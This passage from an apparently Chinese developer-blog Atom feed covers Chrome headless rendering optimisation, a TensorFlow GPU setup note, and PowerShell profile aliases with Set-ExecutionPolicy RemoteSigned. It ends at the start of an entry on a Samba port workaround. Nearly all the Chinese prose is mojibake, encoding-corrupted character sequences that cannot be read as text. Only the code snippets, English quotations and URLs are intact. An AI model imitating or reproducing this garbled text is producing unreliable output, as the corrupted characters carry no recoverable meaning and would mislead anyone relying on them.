‰∏ÄÊ¨°„ÄÇËøôÊÑèÂë≥ÁùÄÔºöÊØèÊ¨°Ê∏≤Êüì‰∏Ä‰∏™Êñ∞ÁöÑÂå∫ÂüüÊàñË°®Ê†ºÔºåÈÉΩÈúÄË¶ÅÂà©Áî®‰πãÂâçÊâÄÊúâÂå∫ÂüüÂíåË°®Ê†ºÁöÑÊï∞ÊçÆÔºàÂõ†‰∏∫Ë¶ÅË¶ÜÁõñÂú®ÂÆÉ‰ª¨‰∏äÈù¢ÔºâÔºåÊâÄ‰ª•ÊØèÊ¨°ÈúÄË¶ÅËÆ°ÁÆóÁöÑÂÖÉÁ¥†Â∞±Ë∂äÊù•Ë∂äÂ§ö„ÄÇÂ≠¶ËøáÁÆóÊ≥ïÁöÑÂêåÂ≠¶ÂèØËÉΩ‰ºöÊÑèËØÜÂà∞ÔºåËøô‰∏™ÊñπÊ≥ïÁöÑÊó∂Èó¥Â§çÊùÇÂ∫¶È´òËææ <code>O(N^2)</code>ÔºÅ</p><p>ËÉΩ‰∏çËÉΩÂè™ Recalculate Style ‰∏ÄÊ¨°Âë¢ÔºüÂèØ‰ª•ÁöÑÔºåÂè™ÈúÄË¶ÅÂú®‰∏ÄÂºÄÂßãÂÖàÂ∞ÜÊúÄÂ§ñÂ±ÇÂÖÉÁ¥†ËÆæÁΩÆ‰∏∫ <code>display: none</code>ÔºåËøôÊ†∑ÂèØ‰ª•ÈÅøÂÖçÊØèÂä†ËΩΩ‰∏ÄÂùóÂ∞±Ê∏≤ÊüìÔºõÁÑ∂ÂêéÂú®ÂÖ®ÈÉ®Âä†ËΩΩÂÆå‰πãÂêé‰∏Ä‰∏ãÂ≠êÂÖ®ÈÉ®Ê∏≤ÊüìÂá∫Êù•ÔºåÊÄùË∑ØÂ§ßÊ¶ÇÊòØËøôÊ†∑ÁöÑÔºö</p><pre><code class="lang-css">/* ‰∏çË¶ÅÁî® *ÔºåÂè™Ë¶ÅÈöêËóèÊúÄÂ§ñÂ±ÇÂÖÉÁ¥†Â∞±Ë∂≥Â§ü‰∫Ü */
.template {
    display: none;
}</code></pre><pre><code class="lang-javascript">/* Âú® body ÊúÄÂêéÁöÑ script ‰∏≠Âä†‰∏äËøôÊÆµ */
const newStyle = document.createElement('style');
newStyle.innerHTML = '.template{display:initial !important}';
document.body.appendChild(newStyle);</code></pre><p>‰ª•ÂèäÊàëÁ™ÅÁÑ∂ÊÑèËØÜÂà∞Ôºå‰πãÂâçÁöÑ‰ª£Á†ÅÂú®Ëé∑ÂèñÂÖÉÁ¥†ÁöÑÊó∂ÂÄô‰ΩøÁî®‰∫Ü <code>document.querySelectorAll('tr')</code>ÔºåËÄåËøô‰∏™ÂáΩÊï∞ÂÖ∂ÂÆûÊòØÁõ∏ÂΩìÊÖ¢ÁöÑ„ÄÇÂ¶ÇÊûúËÉΩÊîπÁî® <code>firstElementChild</code> Âíå <code>nextElementSibling</code> Âàô‰ºöÂø´ÂæàÂ§öÔºåÂõ†‰∏∫Âú® Chrome ‰∏≠ÔºåNode Tree ÁöÑÂ≠òÂÇ®ÁªìÊûÑÊØîËæÉÁ•ûÂ•áÔºåÊØè‰∏™ËäÇÁÇπÂè™Êúâ‰∫î‰∏™ÊåáÈíàÔºö</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/next-sibling.svg" alt="Node Tree ÁöÑ‰∫î‰∏™ÊåáÈíà" title="Node Tree ÁöÑ‰∫î‰∏™ÊåáÈíà"></p><p>Ê†πÊçÆ Chrome Ê∫êÁ†ÅÁöÑ README ÊâÄËø∞Ôºö</p><blockquote><p>That means:</p><ul><li>Siblings are stored as a linked list. It takes O(N) to access a parent's n-th child.</li><li>Parent can't tell how many children it has in O(1).</li></ul></blockquote><p>Âõ†Ê≠§Âà´ËØ¥ÊòØ <code>node.querySelectorAll</code> ‰∫ÜÔºåÂç≥‰ΩøÊòØ <code>node.children</code> ‰πüË¶ÅÂÖàËä±Ë¥π <code>O(N)</code> ÁöÑÊó∂Èó¥ÁîüÊàê‰∏Ä‰∏™ JavaScript ÁöÑÁ±ªÊï∞ÁªÑÔºåÁÑ∂ÂêéÂæàÂèØËÉΩÈÄöËøá <code>Array.from</code> ÊàñËÄÖ <code>...</code> ËøêÁÆóÁ¨¶ËΩ¨Êç¢ÊàêÁúüÊ≠£ÁöÑÊï∞ÁªÑÔºåÊúÄÂêé‰ªé‰∏≠ÊâæÂà∞ÈúÄË¶ÅÁöÑÂÖÉÁ¥†ÔºåËøôÊ†∑‰ºöÊ∂àËÄóÂæàÂ§öÊó∂Èó¥„ÄÇÊó¢ÁÑ∂ÊàëËÉΩÁü•ÈÅìË°®Ê†ºÂÖÉÁ¥†ÁöÑ‰ΩçÁΩÆÔºåÈÇ£‰πàÊé•‰∏ãÊù•ÁöÑÂÖÉÁ¥†ÈÉΩÈÄöËøá <code>firstElementChild</code> Âíå <code>nextElementSibling</code> Êù•ÊâæÔºå‰ºöÊõ¥Âø´‰∏ÄÁÇπ„ÄÇ</p><p>ÂÅöÂÆå‰∫ÜËøô‰∫õ‰øÆÊîπ‰πãÂêéÔºåPerformance ÂèòÊàê‰∫ÜËøôÊ†∑Ôºö</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/2.png" alt="ÁªèËøá‰ºòÂåñ‰πãÂêéÁöÑÊÄßËÉΩ" title="ÁªèËøá‰ºòÂåñ‰πãÂêéÁöÑÊÄßËÉΩ"></p><p>ÂèØ‰ª•ÂèëÁé∞Ôºå‰∏ÄÂºÄÂßã 40 s ÁöÑÊ∏≤ÊüìÊó∂Èó¥ÂáèÂ∞ëÂà∞‰∫Ü 3 sÔºåÂπ∂‰∏îÂêéÈù¢ÁöÑÊéíÁâà‰ª£Á†ÅËøêË°åÈÄüÂ∫¶‰πüÂø´‰∫Ü 8 s Â∑¶Âè≥„ÄÇ</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/laser_pointer_more_power.png" alt="ËÉΩ‰∏çËÉΩÂÜçÁªôÂäõ‰∏ÄÁÇπÂë¢Ôºü" title="ËÉΩ‰∏çËÉΩÂÜçÁªôÂäõ‰∏ÄÁÇπÂë¢Ôºü"></p><h2>ÊûÅËá¥ÁöÑ‰ºòÂåñ</h2><p>‰πãÂâçÊàëÊú¨Êù•Â∑≤ÁªèÊÉ≥‰∏çÂà∞ÁªßÁª≠‰ºòÂåñÁöÑÂäûÊ≥ï‰∫ÜÔºåÂõ†‰∏∫ÊàëÁúã‰∫Ü‰∏Ä‰∏ã Sources ‰∏≠ÊØèË°å‰ª£Á†ÅÂØπÂ∫îÁöÑÊó∂Èó¥ÔºåÂèëÁé∞Â§ßÂ§¥Âú®ËøôÈáåÔºö</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/3.png" alt="Ê≠§Êó∂Ê∂àËÄóÊúÄÂ§öÊó∂Èó¥ÁöÑ‰ª£Á†Å" title="Ê≠§Êó∂Ê∂àËÄóÊúÄÂ§öÊó∂Èó¥ÁöÑ‰ª£Á†Å"></p><p>ÊØèÊ¨°Ëé∑Âèñ <code>tr.offsetHeight</code> Êó∂ÈÉΩÈúÄË¶ÅËøõË°å‰∏ÄÈÅç Layout Êìç‰ΩúÔºåËÄå‰∏îËøòÊòØ Forced reflowÔºå‰ΩÜÊòØÊàëÂèàÂøÖÈ°ªË¶ÅËé∑ÂèñË°®Ê†ºÊØè‰∏ÄË°åÁöÑÈ´òÂ∫¶ÔºåÂõ†‰∏∫Ë°®Ê†º‰∏≠ÁöÑÊï∞ÊçÆÂèØËÉΩ‰ºöÊúâÊç¢Ë°åÔºåÊØèË°åÁöÑÈ´òÂ∫¶ÊòØ‰∏çÁ°ÆÂÆöÁöÑ„ÄÇ</p><p>‰ΩÜÊòØÂú®ÂÜôËøôÁØáÊñáÁ´†‰πãÂâçÔºåÊàëÁ™ÅÁÑ∂ÂèàÊÑèËØÜÂà∞ÔºöÂè™Ë¶ÅËÉΩ‰øùËØÅÁªôÊØè‰∏™Ë°®Ê†ºËÆæÁΩÆÂ•Ω <code>&lt;col&gt;</code> ÁöÑÂÆΩÂ∫¶ÔºåÈÇ£‰πàËøô‰∏ÄË°å‰∏çÁÆ°Ë¢´ÊéíÂà∞Âì™‰∏™Ë°®Ê†ºÂùó‰∏≠ÔºåÈ´òÂ∫¶ÈÉΩÊòØ‰∏çÂèòÁöÑ„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÊâÄÊúâÂÖÉÁ¥†ÁöÑÈ´òÂ∫¶ÔºåÂú®Ê∏≤Êüì‰πãÂêéÊéíÁâà‰πãÂâçÔºåÂ∞±Â∑≤ÁªèÂÆåÂÖ®Á°ÆÂÆö‰∏ãÊù•‰∫ÜÔºÅÈÇ£‰πàÊàëÂÆåÂÖ®ÂèØ‰ª•Âú®ÊéíÁâàÁöÑ‰∏ÄÂºÄÂßãÔºåÂ∞ÜÊâÄÊúâÂøÖË¶ÅÂÖÉÁ¥†ÁöÑ <code>offsetHeight</code> ‰øùÂ≠òÂú®‰∏Ä‰∏™ <code>Map</code> ‰∏≠Ôºå‰πãÂêéÁõ¥Êé•Ë∞ÉÁî®Â∞±ÂèØ‰ª•‰∫Ü„ÄÇ</p><p>Âú®‰ºòÂåñÂâçÔºåËé∑ÂèñÈ´òÂ∫¶ÁöÑÊó∂Êú∫ÊòØÂú®ÊéíÁâàÊó∂ÔºåËøôÊÑèÂë≥ÁùÄÊØèÊ¨°‰øÆÊîπ‰∫Ü DOM ÁªìÊûÑÂêéÔºåÂÜçÂú®‰∏ã‰∏ÄËΩÆÂæ™ÁéØ‰∏≠Ëé∑ÂèñÂè¶‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑÈ´òÂ∫¶ÔºåÂõ†Ê≠§ÊØèÊ¨°Ëé∑ÂèñÈÉΩ‰ºöÊúâ LayoutÔºõ‰ºòÂåñÂêéÔºåËé∑ÂèñÈ´òÂ∫¶ÁöÑÊó∂Êú∫ÊòØÂú®ÊéíÁâà‰πãÂâçÔºåËÄåÊéíÁâàÊó∂Âè™‰ºöËé∑ÂèñÂÖÉÁ¥†È´òÂ∫¶Ôºå‰∏ç‰ºö‰øÆÊîπÊ†∑ÂºèÂíå DOM ÁªìÊûÑÔºåÂõ†Ê≠§Âè™‰ºö Layout ‰∏ÄÊ¨°„ÄÇ</p><p>ÊÄùË∑ØÂ§ßÊ¶ÇÊòØËøôÊ†∑Ôºö</p><pre><code class="lang-javascript">const trHeights = new Map();
const headAreaHeights = new Map();
const tailAreaHeights = new Map();
const theadHeights = new Map();
const tbodyHeights = new Map();
Array.from(document.querySelectorAll('tbody &gt; tr')).forEach(el =&gt; {
    trHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('.__area_head')).forEach(el =&gt; {
    headAreaHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('.__area_tail')).forEach(el =&gt; {
    tailAreaHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('thead')).forEach(el =&gt; {
    theadHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('tbody')).forEach(el =&gt; {
    tbodyHeights.set(el, el.offsetHeight);
});</code></pre><p>ËøôÊÆµ‰ª£Á†ÅÊòØ‰∏ÄÊ¨°ÊÄßÊâßË°åÁöÑÔºåÂõ†Ê≠§ÂØπÊïàÁéáÁöÑÂΩ±ÂìçÂèØ‰ª•ÂøΩÁï•„ÄÇÊé•‰∏ãÊù•ÊääÂêéÈù¢ÁöÑ <code>offsetHeight</code> ÈÉΩÊõøÊç¢ÊàêËøôÊ†∑Ôºö</p><pre><code class="lang-javascript">trs.forEach((tr, index) =&gt; {
    // const rowHeight = tr.offsetHeight;
    const rowHeight = trHeights.get(tr);

    /* other codes */
});</code></pre><p>Áúã‰∏Ä‰∏ã PerformanceÔºåÊòØËøôÊ†∑ÁöÑÔºö</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/4.png" alt="‰ºòÂåñ‰∫Ü Layout ÂêéÁöÑÊÄßËÉΩ" title="‰ºòÂåñ‰∫Ü Layout ÂêéÁöÑÊÄßËÉΩ"></p><p>ËøôÊïàÊûú‰πüÂ§™Â•Ω‰∫ÜÂêßÔºÅÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™ÂõæÁöÑÂê´‰πâÔºö</p><ul><li>0 ms ~ 400 ms ÊòØÂú®Âä†ËΩΩÈ°µÈù¢ÔºåËøô‰∏™ÁêÜËÆ∫‰∏äÊòØÊ≤°Ê≥ïÂÜç‰ºòÂåñÁöÑÔºõ</li><li>400 ms ~ 2300 ms ÊòØ‰∏ÄÂºÄÂßãÂ∞ÜÊâÄÊúâÂÖÉÁ¥†ÊòæÁ§∫Âá∫Êù•Ôºå‰∫éÊòØ Chrome ÂÅö‰∫Ü‰∏ÄÈÅç LayoutÔºõ</li><li>2300 ms ~ 2500 ms ÊòØÊàëÁöÑÊéíÁâà‰ª£Á†ÅÔºåÊ≠§Êó∂Áî±‰∫éÊ≤°Êúâ‰ªª‰ΩïËé∑ÂèñÊ†∑ÂºèÁöÑÊìç‰ΩúÔºåÊµèËßàÂô®‰ºöÂ∞ÜÊâÄÊúâÁöÑÊ†∑ÂºèËÆ°ÁÆóÈõÜ‰∏≠Âà∞‰∏ã‰∏Ä‰∏™‰∫ã‰ª∂Âæ™ÁéØ‰∏≠Áªü‰∏ÄÂ§ÑÁêÜÔºõ</li><li>2500 ms ~ 4900 ms ÊòØÁªü‰∏ÄÂ§ÑÁêÜÁöÑÊ†∑ÂºèËÆ°ÁÆóÔºåËøôÈúÄË¶Å‰∏ÄÊ¨° Layout„ÄÇ</li></ul><p>ÁêÜËÆ∫‰∏äËÆ≤ÔºåLayout ÁöÑÊ¨°Êï∞Â∑≤Áªè‰∏çÂèØËÉΩÂÜçÂ∞ë‰∫ÜÔºå‰∏§Ê¨° Layout ÁöÑÊó∂Èó¥ÂèñÂÜ≥‰∫éÈù¢ÂçïÁöÑÂ§çÊùÇÁ®ãÂ∫¶ÔºåÂèØËÉΩÂèØ‰ª•ÈÄöËøá‰ºòÂåñ CSS ÁöÑÊñπÂºèÊù•ÊèêÈÄüÔºå‰ΩÜ‰∏çÁ°ÆÂÆöÊïàÊûúÂ¶Ç‰ΩïÔºàÊØïÁ´üÁé∞Âú®Âπ≥ÂùáÊØè‰∏™ÂÖÉÁ¥†Âè™Êúâ‰∏çÂà∞ 0.5 ms ÁöÑÁªòÂà∂Êó∂Èó¥Ôºâ„ÄÇÂõ†Ê≠§ÊàëËßâÂæóÔºåËøôÂèØ‰ª•ÁÆóÊòØÈùûÂ∏∏ÊûÅËá¥ÁöÑ‰ºòÂåñ‰∫Ü„ÄÇ</p><h1>ÂèÇËÄÉËµÑÊñôÔºàÈÉ®ÂàÜÂõæÊ∫êÔºâ</h1><ul><li><a href="https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/core/dom/README.md">DOM - Chromium Source Code README</a></li><li><a href="https://what-if.xkcd.com/13/">Laser Pointer - What If - xkcd</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R¬∑ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/</id>
        <title><![CDATA[Ubuntu16.04ÈÖçÁΩÆTensorFlow-vGPUÁéØÂ¢É]]></title>
        <updated>2020-04-29T18:07:07+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/"><![CDATA[ÊäòËÖæ‰∫Ü‰∏Ä‰∏™‰∏ãÂçàÔºåÁªà‰∫éÂú®Ubuntu 16.04Á≥ªÁªü‰∏äÈÖçÁΩÆÂ•Ω‰∫ÜTensorFlowÁöÑvGPUÁéØÂ¢ÉÔºå‰∏ªË¶ÅÊ∂âÂèäÊòæÂç°È©±Âä®„ÄÅCUDA„ÄÅAnaconda„ÄÅTensorflow-gpuÂÆâË£ÖÁ≠âÔºåËøôÈáåÊù•ÂÅö‰∏Ä‰∏ãÁ¨îËÆ∞Âñµ„ÄÇ]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/</id>
        <title><![CDATA[‰∏∫ Windows PowerShell ËÆæÁΩÆ User Alias ÔºàÂëΩ‰ª§Âà´ÂêçÔºâ]]></title>
        <updated>2020-04-28T09:16:41+08:00</updated>
        <link href="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"><![CDATA[<blockquote><p>Áõ¥Êé•ÁúãÊ≠•È™§ÁöÑËØùÔºåÂú®ÊúÄ‰∏ãÊñπ„ÄÇ</p></blockquote><h2 id="ËÉåÊôØ"><a href="#ËÉåÊôØ" class="headerlink" title="ËÉåÊôØ"></a>ËÉåÊôØ</h2><p>Windows Terminal ËôΩÁÑ∂ËøòÂ§Ñ‰∫éÈ¢ÑËßàÈò∂ÊÆµÔºå‰ΩÜÊòØ‰πüÂá∫Êù•ÂæàÈïø‰∏ÄÊÆµÊó∂Èó¥‰∫Ü„ÄÇÂÆÉÁöÑÂéÜÂè≤‰ΩøÂëΩÔºå‰πüËÆ∏Â∞±ÊòØËÆ©ÂéüÁîü Windows ‰πüËÉΩÊúâ‰∏Ä‰∏™ÂÉèÊ†∑ÁöÑÂëΩ‰ª§Ë°åÁéØÂ¢É„ÄÇ‰ª•ÂâçÊàë‰∏ÄÁõ¥Âú®Áî® CmderÔºå‰ΩÜÊòØ Cmder ÁöÑÂêØÂä®ÈÄüÂ∫¶Á°ÆÂÆû‰∏çÊï¢ÊÅ≠Áª¥ÔºåËÄå Windows Terminal ÂêØÂä®Á°ÆÂÆûÂæàÂø´„ÄÇÁõ∏ÊØî CmderÔºå Windows Terminal ËøòÁº∫Â∞ëÂæàÂ§öÂäüËÉΩÔºå‰∏çËøá‰ª•ÂêéÂ∫îËØ•ÂæàÂø´‰πü‰ºöË°•‰∏ä„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29b3f1.png" style="zoom:50%;"></p><p>ÊàëÊÉ≥Â∞ùËØï‰ΩøÁî® Windows Termimal ËøõË°åÂºÄÂèë„ÄÇWindows Terminal ÈªòËÆ§ÂèØ‰ª•‰ΩøÁî® <code>PowerShell</code>„ÄÅ<code>cmd</code>„ÄÅ<code>wsl bash</code>‰Ωú‰∏∫ËÑöÊú¨Â∑•ÂÖ∑„ÄÇÊó¢ÁÑ∂ÊòØÂú® Windows ÁéØÂ¢É‰∏ãÂòõÔºåËøòÊòØÂæóÂ∞äÊï¨‰∏Ä‰∏ã Windows PoweShell ÁöÑ„ÄÇÂàùÊ¨°‰ΩøÁî®ÔºåÊàëËßâÂæó PowerShell Ë∑ü Cmder Áî®Ëµ∑Êù•ÔºåÊúÄ‰∏çÊñπ‰æøÁöÑ‰∏ÄÁÇπÂ∞±ÊòØÔºåÊàëÂú® Cmder ÈáåÈù¢ËÆæ‰∫ÜÂæàÂ§öÁöÑ AliasÔºå‰πüÂ∞±ÊòØÈÄöËøá‰øÆÊîπ <code>config/user_aliases.cmd</code> ÂÜô‰∏Ä‰∏≤ <code>&lt;alia&gt;=&lt;xxx&gt; &lt;xxx&gt;</code> Êù•ÂÆûÁé∞ÁöÑ„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29ad52.png" style="zoom:50%;"></p><p>‰ΩÜÊòØÔºåPowerShell Â¶Ç‰ΩïÂÆûÁé∞ÂëΩ‰ª§ÁöÑÂà´ÂêçËÆæÁΩÆÂë¢Ôºü</p><h2 id="Êé¢Á¥¢ËøáÁ®ãÂèäÂéüÁêÜÊ¶ÇËø∞"><a href="#Êé¢Á¥¢ËøáÁ®ãÂèäÂéüÁêÜÊ¶ÇËø∞" class="headerlink" title="Êé¢Á¥¢ËøáÁ®ãÂèäÂéüÁêÜÊ¶ÇËø∞"></a>Êé¢Á¥¢ËøáÁ®ãÂèäÂéüÁêÜÊ¶ÇËø∞</h2><p>Â¶ÇÊûúÊêúÁ¥¢ÂÖ≥ÈîÆËØç <code>windows powershell set user alias</code>ÔºåÈÄöÂ∏∏Ë∞∑Ê≠å‰ºöÁªôÂá∫<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6" target="_blank" rel="noopener">ÂæÆËΩØÂÆòÊñπÊñáÊ°£</a>Ôºå‰ΩÜÊòØËøô‰∏™ÊñáÊ°£Âè™ÊòØÂëäËØâÊàë‰ª¨Â¶Ç‰ΩïÂú®ËÑöÊú¨ÈáåÈù¢ËÆæÁΩÆ‰∏¥Êó∂ÁöÑÂà´ÂêçÔºåÂ¶ÇÊûúË¶ÅËÆæÁΩÆÊ∞∏‰πÖÂà´ÂêçÔºåËØ•ÊÄé‰πàÂäûÔºüÂÆûÈôÖ‰∏äÔºå‚ÄúÂà´Âêç‚ÄùËøôÁßç‰∏úË•øÔºå‰πüÂ∞±ÊòØ <code>alias</code>ÔºåÂá†‰πéÊâÄÊúâÁöÑËÑöÊú¨ËØ≠Ë®ÄÔºåÈÉΩÊ≤°ÊúâÊâÄË∞ìÁöÑ‚ÄúÊ∞∏‰πÖÂà´Âêç‚Äù(Permanent alias)ÔºåÊàë‰ª¨‰ΩøÁî® Linux bash „ÄÅCmder ‰πãÁ±ªÁöÑËÑöÊú¨Â∑•ÂÖ∑ÔºåÊâìÂºÄÁªàÁ´ØÊó∂ÔºåÁ≥ªÁªü‰ºöÈªòËÆ§ÊâßË°å‰∏Ä‰∏™ËÑöÊú¨Êñá‰ª∂Ôºà bash ÊòØÁî®Êà∑ÁõÆÂΩï‰∏ãÁöÑ <code>.bashrc</code>ÔºåCmder ÊòØ <code>config/user_aliases.cmd</code> ÔºâÔºåËÄåËøôÊ†∑ÁöÑËÑöÊú¨Êñá‰ª∂ÈáåÔºåÂ∞±ÂåÖÂê´‰∫ÜÂà´ÂêçÁöÑÂÆö‰πâ„ÄÇËøô‰πüÊòØ‰∏∫‰ªÄ‰πàÔºåÊàë‰ª¨Âú® Linux Á±ªÁ≥ªÁªü‰∏≠Ôºå‰øÆÊîπ <code>.bashrc</code> ÂêéÔºåÂøÖÈ°ªË¶ÅÈáçÊñ∞ÁôªÂá∫ÁôªÂΩï„ÄÅÊàñËÄÖ <code>source .bashrc</code> ÁöÑÂéüÂõ†‰∫Ü„ÄÇ</p><p>ÊâÄ‰ª•ÔºåÊàë‰ª¨Âè™Ë¶Å‰øÆÊîπ Windows Powershell ÂêØÂä®Êó∂ÊâßË°åÁöÑÊñá‰ª∂Â∞±Ë°å‰∫Ü„ÄÇÂæàÂ§öËÆ∫ÂùõÈáåÈù¢ËØ¥ÔºåÈªòËÆ§ÊâßË°åÁöÑËÑöÊú¨ÊòØ <code>$Home\Documents\profile.ps1</code> Ôºå‰πüÂ∞±ÊòØ <code>C:\Users\‰Ω†ÁöÑÁî®Êà∑Âêç\Documents\profile.ps1</code> Ôºå‰ΩÜÊòØËøôÂπ∂‰∏çÊ≠£Á°ÆÔºåÊúÄÂ•ΩÁöÑÊñπÂºèÊòØÔºåÂÖàÂêØÂä® PowerShell ÔºåÂÜçÊâßË°å <code>echo $profile</code>ÔºåËøôÊ†∑ÂæóÂà∞ÁöÑÊñá‰ª∂Ë∑ØÂæÑÔºåÊâçÊòØ PowerShell ÁöÑÈªòËÆ§ÊâßË°åÊñá‰ª∂Ë∑ØÂæÑ„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29d447.png" alt></p><p>ÁÑ∂ÂêéÔºåÂàõÂª∫Ëøô‰∏™Êñá‰ª∂Â∞±Â•ΩÂï¶„ÄÇ</p><p>Âú®Êñá‰ª∂ÈáåÈù¢ÔºåÂÜô‰∏äÂà´ÂêçËÆæÁΩÆÁöÑËØ≠Âè•„ÄÇÂÜç‰∏ÄÊ¨°Ê≥®ÊÑèÔºåÂÅáÂ¶Ç‰Ω†ÁöÑÂà´ÂêçÊåá‰ª£ÁöÑÂëΩ‰ª§Âê´ÊúâÁ©∫Ê†ºÔºåÂ∞±‰∏çÂèØ‰ª•‰ΩøÁî® <code>New-Alias</code> ÂëΩ‰ª§ÔºåÂõ†‰∏∫ÂÆÉ‰∏çËÉΩÂ∏¶Á©∫Ê†ºÔºåÂç≥‰Ωø‰Ω†ÊääÊåá‰ª£ÁöÑÂëΩ‰ª§Áî®ÂºïÂè∑Êã¨Ëµ∑Êù•‰πüÊ≤°Áî®„ÄÇÈÇ£ÊÄé‰πàÂäûÂë¢ÔºüÁªßÁª≠Ë∞∑Ê≠åÔºåÂéüÊù•ÔºåÊ≠£Á°ÆÂßøÂäøÊòØÁî® <code>function</code> Ôºå‰πüÂ∞±ÊòØÔºåÊàë‰ª¨ÊääËá™Â∑±Ë¶ÅÂÆö‰πâÁöÑÊåá‰ª§ÔºåÂÆö‰πâ‰∏∫‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂ∞±Ë°åÂï¶„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef339443.png" style="zoom: 67%;"></p><p>‰øùÂ≠òÊñá‰ª∂ÔºåÈáçÊñ∞ÂêØÂä® PowerShell ‰ª•ÂêéÔºå‰∏çÂá∫ÊÑèÂ§ñÔºåÂ∫îËØ•‰ºöÊä•‰∏Ä‰∏™ <code>File xxxxxxx\Microsoft.PowerShell_profile.ps1 cannot be loaded because running scripts is disabled on this system.</code> Ê†πÊçÆ<a href="https://tecadmin.net/powershell-running-scripts-is-disabled-system/" target="_blank" rel="noopener">Ê≠§ÈìæÊé•</a>ÔºåÂá∫Áé∞ËøôÁßçÊÉÖÂÜµÔºåÊòØÂõ†‰∏∫ Windows Á≥ªÁªü‰∏∫‰∫ÜÈò≤Ê≠¢ÊÅ∂ÊÑèËÑöÊú¨Ëá™Âä®ÊâßË°åÔºåÊïÖÈªòËÆ§‰∏çÂÖÅËÆ∏Ëá™Âä®ËøêË°åËÑöÊú¨„ÄÇÊâÄ‰ª•ÔºåÂú®Á°ÆÂÆöËá™Â∑±ÊúâËÉΩÂäõÊääÊéßÁöÑÊÉÖÂÜµ‰∏ãÔºå<strong>‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩ</strong>ÔºåÂú® PowerShell ‰∏≠ÊâßË°å <code>Set-ExecutionPolicy RemoteSigned</code>ÔºåÂç≥ÂèØ„ÄÇ</p><p>ÂÜçÊ¨°ÈáçÂêØ PowerShellÔºåÂ∫îËØ•ÂèØ‰ª•ÂèëÁé∞ÔºåËá™ÂÆö‰πâÂà´ÂêçÂ∑≤ÁªèÁîüÊïà‰∫Ü„ÄÇ</p><h2 id="Ê≠•È™§Êï¥ÁêÜ"><a href="#Ê≠•È™§Êï¥ÁêÜ" class="headerlink" title="Ê≠•È™§Êï¥ÁêÜ"></a>Ê≠•È™§Êï¥ÁêÜ</h2><p>Â¶ÇÊûú‰Ω†ÊÉ≥‰∏∫Ëá™Â∑±ÁöÑ Windows PowerShell ËÆæÁΩÆÊ∞∏‰πÖÁöÑÂëΩ‰ª§Âà´Âêç (Alias)ÔºåÂèØ‰ª•ÈÅµÂæ™‰ª•‰∏ãÊ≠•È™§Ôºö</p><ol><li><p>ÊâìÂºÄ PowerShell ÔºåËøêË°å <code>echo $profile</code>Ôºå‰ºöËæìÂá∫‰∏Ä‰∏™Êñá‰ª∂Ë∑ØÂæÑ„ÄÇÂàõÂª∫Ëøô‰∏™Êñá‰ª∂„ÄÇ</p></li><li><p>ÊâìÂºÄÂàöÂàõÂª∫ÁöÑÊñá‰ª∂ÔºåÊåâ‰ª•‰∏ãÊ†ºÂºèËÆæÁΩÆÂ§öÊù°Âà´ÂêçÔºö</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Âà´Âêç &#123; ÈúÄË¶ÅÊõø‰ª£ÁöÑÂëΩ‰ª§ÔºåÂèØ‰ª•ÂåÖÂê´Á©∫Ê†º &#125;</span><br></pre></td></tr></table></figure></li><li><p>‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÊâìÂºÄ PowerShellÔºåÊâßË°å <code>Set-ExecutionPolicy RemoteSigned</code>„ÄÇ</p></li><li><p>ÈáçÊñ∞ÂêØÂä® PowerShell ÔºåÂ∫îËØ•Â∑≤ÁªèÂÆåÊàê‰∫Ü„ÄÇ</p></li></ol>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/</id>
        <title><![CDATA[‰ΩøÁî®ËôöÊãüÊú∫ÁªïËøá Windows Samba ÂÆ¢Êà∑Á´ØÁ´ØÂè£ÈôêÂà∂]]></title>
        <updated>2020-04-28T06:19:26+08:00</updated>
        <link href="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"/>
